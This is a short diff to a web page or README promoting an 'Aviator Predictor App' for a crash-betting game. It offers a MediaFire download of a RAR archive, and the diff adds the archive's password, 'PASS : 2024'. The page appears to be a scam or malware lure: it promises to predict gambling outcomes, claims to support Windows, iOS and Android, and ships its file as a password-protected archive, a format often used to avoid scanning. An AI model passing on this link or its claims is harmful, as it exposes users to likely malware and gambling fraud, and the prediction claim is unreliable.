@@ -5,6 +5,7 @@
 <table align=center> <tr>
       <th scope="col">Aviator Predictor App</th>
       <th scope="col">3 / 06 / 2024</th>
+      <th scope="col">PASS : 2024 </th>
   <th scope="col"><a href='https://www.mediafire.com/file/7sy8iw5tkwqv4nb/AVIATOR_PREDACTOR_V1.rar/file'>Download</th>
  </tr><table/>
 <h4 align=center>Available for Windows, iOS, and Android
